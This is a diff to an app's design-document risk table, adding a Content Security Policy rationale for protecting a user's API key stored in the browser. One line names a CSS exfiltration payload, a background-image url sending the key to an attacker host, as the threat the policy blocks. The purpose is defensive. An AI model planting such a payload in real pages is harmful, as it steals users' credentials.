@@ -240,7 +240,7 @@ Note: locked principles (positive-only, chat-first, care-not-blame, condition-mi
 
 | Risk | Mitigation |
 |---|---|
-| Browser key storage (XSS would expose BYO key) | No third-party scripts at all; key in localStorage on a static-origin app; Tauri keychain on vehicle B. Documented honestly in Settings copy. |
+| Browser key storage (XSS would expose BYO key) | No third-party scripts at all; key in localStorage on a static-origin app; Tauri keychain on vehicle B. Documented honestly in Settings copy. A tight CSP (`security-headers.conf` for web, `tauri.conf.json` for desktop) is the second layer: `style-src 'self'` carries **no `'unsafe-inline'`** — it was never load-bearing (MEW ships one extracted stylesheet, zero inline `<style>`/`style=""` strings; React `style={{…}}` props are CSSOM writes, which `style-src` does not govern), and dropping it closes CSS-based exfiltration such as an injected `background-image: url(https://attacker/?k=…)`. `script-src 'self'`, `object-src 'none'`, and `base-uri/form-action 'self'` round out the policy; `connect-src` enumerates only the model and calendar origins so a stolen key has nowhere to be sent. |
 | IndexedDB eviction | `navigator.storage.persist()` on first run; one-click JSON export/import. |
 | Anthropic browser CORS requires explicit opt-in | SDK `dangerouslyAllowBrowser: true` — correct for a BYO-key personal app where user == key owner. |
 | Drift detection ≠ real activity (only sees this tab) | MVP heuristic is in-app idleness + tab visibility, stated in copy ("~12 min"); vehicle B can add OS-level idle later. |
